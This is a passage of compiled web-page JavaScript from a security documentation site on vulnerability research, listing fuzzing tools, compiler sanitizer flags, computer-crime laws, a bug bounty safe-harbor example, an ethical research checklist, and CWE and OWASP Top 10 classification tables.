Tools"}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"Tool"}),(0,r.jsx)(n.th,{children:"Type"}),(0,r.jsx)(n.th,{children:"Website"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"AFL++"}),(0,r.jsx)(n.td,{children:"Coverage-guided"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.a,{href:"https://github.com/AFLplusplus/AFLplusplus",children:"https://github.com/AFLplusplus/AFLplusplus"})})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"LibFuzzer"}),(0,r.jsx)(n.td,{children:"Coverage-guided"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.a,{href:"https://llvm.org/docs/LibFuzzer.html",children:"https://llvm.org/docs/LibFuzzer.html"})})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Honggfuzz"}),(0,r.jsx)(n.td,{children:"Feedback-driven"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.a,{href:"https://github.com/google/honggfuzz",children:"https://github.com/google/honggfuzz"})})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Radamsa"}),(0,r.jsx)(n.td,{children:"Mutation-based"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.a,{href:"https://gitlab.com/akihe/radamsa",children:"https://gitlab.com/akihe/radamsa"})})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Boofuzz"}),(0,r.jsx)(n.td,{children:"Network protocol"}),(0,r.jsx)(n.td,{children:(0,r.jsx)(n.a,{href:"https://github.com/jtpereyda/boofuzz",children:"https://github.com/jtpereyda/boofuzz"})})]})]})]}),"\n",(0,r.jsx)(n.h3,{id:"sanitizers-debugging",children:"Sanitizers (Debugging)"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# AddressSanitizer (detect memory errors)\ngcc -fsanitize=address -g program.c -o program\n\n# UndefinedBehaviorSanitizer (detect undefined behavior)\ngcc -fsanitize=undefined -g program.c -o program\n\n# MemorySanitizer (detect uninitialized reads)\nclang -fsanitize=memory -g program.c -o program\n\n# ThreadSanitizer (detect race conditions)\ngcc -fsanitize=thread -g program.c -o program\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"legal--ethical-considerations",children:"Legal & Ethical Considerations"}),"\n",(0,r.jsx)(n.h3,{id:"legal-framework",children:"Legal Framework"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"United States:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Computer Fraud and Abuse Act (CFAA)"})," - 18 U.S.C. \xa7 1030","\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Accessing computers without authorization is illegal"}),"\n",(0,r.jsx)(n.li,{children:"Exceeding authorized access is illegal"}),"\n",(0,r.jsx)(n.li,{children:"Penalties: Fines and imprisonment"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"European Union:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Cybercrime Directive"})," - Directive 2013/40/EU"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"GDPR"})," - Data protection during research"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"United Kingdom:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Computer Misuse Act 1990"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Unauthorized access (Section 1)"}),"\n",(0,r.jsx)(n.li,{children:"Unauthorized modification (Section 3)"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"safe-harbor-legal-protection",children:"Safe Harbor (Legal Protection)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Bug bounty safe harbor:"})}),"\n",(0,r.jsx)(n.p,{children:"Many programs include safe harbor language:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:'"We will not pursue legal action against researchers who:\n- Make good faith effort to avoid privacy violations\n- Only access data necessary for vulnerability demonstration\n- Do not perform attacks that degrade service quality\n- Report vulnerabilities promptly\n- Keep vulnerability information confidential until fix is available"\n'})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Importance:"})," Provides legal protection for good-faith security research."]}),"\n",(0,r.jsx)(n.h3,{id:"ethical-research-checklist",children:"Ethical Research Checklist"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Before testing:"})}),"\n",(0,r.jsxs)(n.ul,{className:"contains-task-list",children:["\n",(0,r.jsxs)(n.li,{className:"task-list-item",children:[(0,r.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Have written authorization (scope, rules of engagement)"]}),"\n",(0,r.jsxs)(n.li,{className:"task-list-item",children:[(0,r.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Understand legal boundaries"]}),"\n",(0,r.jsxs)(n.li,{className:"task-list-item",children:[(0,r.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Have appropriate insurance (if applicable)"]}),"\n",(0,r.jsxs)(n.li,{className:"task-list-item",children:[(0,r.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Know emergency contact for responsible disclosure"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"During research:"})}),"\n",(0,r.jsxs)(n.ul,{className:"contains-task-list",children:["\n",(0,r.jsxs)(n.li,{className:"task-list-item",children:[(0,r.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Only test authorized systems"]}),"\n",(0,r.jsxs)(n.li,{className:"task-list-item",children:[(0,r.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Minimize impact (no DoS, don't access unnecessary data)"]}),"\n",(0,r.jsxs)(n.li,{className:"task-list-item",children:[(0,r.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Document findings thoroughly"]}),"\n",(0,r.jsxs)(n.li,{className:"task-list-item",children:[(0,r.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Protect sensitive data discovered"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"After discovery:"})}),"\n",(0,r.jsxs)(n.ul,{className:"contains-task-list",children:["\n",(0,r.jsxs)(n.li,{className:"task-list-item",children:[(0,r.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Report vulnerability to vendor promptly"]}),"\n",(0,r.jsxs)(n.li,{className:"task-list-item",children:[(0,r.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Provide reasonable time for vendor to fix (90 days standard)"]}),"\n",(0,r.jsxs)(n.li,{className:"task-list-item",children:[(0,r.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Don't publicly disclose until fix is available"]}),"\n",(0,r.jsxs)(n.li,{className:"task-list-item",children:[(0,r.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Request CVE for tracking"]}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"related-sops",children:"Related SOPs"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:(0,r.jsx)(n.code,{children:"Reverse-Engineering.md"})})," - Binary analysis and disassembly techniques"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:(0,r.jsx)(n.code,{children:"Web-Application-Security.md"})})," - Web application vulnerability testing"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:(0,r.jsx)(n.code,{children:"Cryptography-Analysis.md"})})," - Cryptographic vulnerability research"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:(0,r.jsx)(n.code,{children:"Firmware-Reverse-Engineering.md"})})," - Embedded device security"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:(0,r.jsx)(n.code,{children:"../OSINT/Techniques/sop-legal-ethics.md"})})," - Legal framework for security research"]}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"appendix-vulnerability-classification",children:"Appendix: Vulnerability Classification"}),"\n",(0,r.jsx)(n.h3,{id:"cwe-common-weakness-enumeration",children:"CWE (Common Weakness Enumeration)"}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"CWE ID"}),(0,r.jsx)(n.th,{children:"Name"}),(0,r.jsx)(n.th,{children:"Category"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"CWE-119"}),(0,r.jsx)(n.td,{children:"Buffer Overflow"}),(0,r.jsx)(n.td,{children:"Memory Corruption"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"CWE-79"}),(0,r.jsx)(n.td,{children:"Cross-Site Scripting"}),(0,r.jsx)(n.td,{children:"Injection"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"CWE-89"}),(0,r.jsx)(n.td,{children:"SQL Injection"}),(0,r.jsx)(n.td,{children:"Injection"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"CWE-416"}),(0,r.jsx)(n.td,{children:"Use After Free"}),(0,r.jsx)(n.td,{children:"Memory Corruption"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"CWE-787"}),(0,r.jsx)(n.td,{children:"Out-of-bounds Write"}),(0,r.jsx)(n.td,{children:"Memory Corruption"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"CWE-20"}),(0,r.jsx)(n.td,{children:"Improper Input Validation"}),(0,r.jsx)(n.td,{children:"Input Validation"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"CWE-125"}),(0,r.jsx)(n.td,{children:"Out-of-bounds Read"}),(0,r.jsx)(n.td,{children:"Information Disclosure"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"CWE-78"}),(0,r.jsx)(n.td,{children:"OS Command Injection"}),(0,r.jsx)(n.td,{children:"Injection"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"CWE-190"}),(0,r.jsx)(n.td,{children:"Integer Overflow"}),(0,r.jsx)(n.td,{children:"Numeric Errors"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"CWE-862"}),(0,r.jsx)(n.td,{children:"Missing Authorization"}),(0,r.jsx)(n.td,{children:"Access Control"})]})]})]}),"\n",(0,r.jsx)(n.h3,{id:"owasp-top-10-mapping",children:"OWASP Top 10 Mapping"}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"OWASP Category"}),(0,r.jsx)(n.th,{children:"Related CWEs"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"A01:2021 - Broken Access Control"}),(0,r.jsx)(n.td,{children:"CWE-22, CWE-284, CWE-639"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"A02:2021 - Cryptographic Failures"}),(0,r.jsx)(n.td,{children:"CWE-259, CWE-327, CWE-916"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"A03:2021 - Injection"}),(0,r.jsx)(n.td,{children:"CWE-79, CWE-89, CWE-94"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"A04:2021 - Insecure Design"}),(0,r.jsx)(n.td,{children:"CWE-209, CWE-256, CWE-501"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"A05:2021 - Security Misconfiguration"}),(0,r.jsx)(n.td,{children:"CWE-16, CWE-611"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"A06:2021 - Vulnerable Components"}),(0,r.jsx)(n.td,{children:"CWE-1035, CWE-1104"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"A07:2021 - Authentication Failures"}),(0,r.jsx)(n.td,{children:"CWE-287, CWE-384"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"A08:2021 - Software Integrity Failures"}),(0,r.jsx)(n.td,{children:"CWE-502, CWE-829"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"A09:2021 - Logging Failures"}),(0,r.jsx)(n.td,{children:"CWE-117, CWE-223"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"A10:2021 - SSRF"}),(0,r.jsx)(n.td,{children:"CWE-918"})]})]})]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"related-sops-1",children:"Related SOPs"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Analysis:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"../../Security/Analysis/sop-reverse-engineering",children:"Reverse Engineering"})," - Binary vulnerability analysis and exploit development"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"../../Security/Analysis/sop-cryptography-analysis",children:"Cryptography Analysis"})," - Cryptographic vulnerability research"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"../../Security/Analysis/sop-malware-analysis",children:"Malware Analysis"})," - Analyzing vulnerability exploitation in malware"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Pentesting & Security:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"../../Security/Pentesting/sop-linux-pentest",children:"Linux Pentesting"})," - Linux vulnerability exploitation"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"../../Security/Pentesting/sop-ad-pentest",children:"Active Directory Pentesting"})," - Windows and AD vulnerability research"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"../../Security/Pentesting/sop-web-application-security",children:"Web Application Security"})," - Web vulnerability identification"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"../../Security/Pentesting/sop-mobile-security",children:"Mobile Security"})," - Mobile platform vulnerability research"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"../../Security/Pentesting/sop-firmware-reverse-engineering",children:"Firmware Reverse Engineering"})," - Embedded device vulnerability research"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"../../Security/Pentesting/sop-bug-bounty",children:"Bug Bounty Hunting"})," - Responsible vulnerability disclosure"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"../../Security/Pentesting/sop-detection-evasion-testing",children:"Detection Evasion Testing"})," - Testing exploit detection capabilities"]}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},28453:(e,n,i)=>{i.d(n,{R:()=>t,x:()=>a});var s=i(96540);const r={},l=s.createContext(r);function t(e){const n=s.useContext(l);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:t(e.components),s.createElement(l.Provider,{value:n},e.children)}}}]);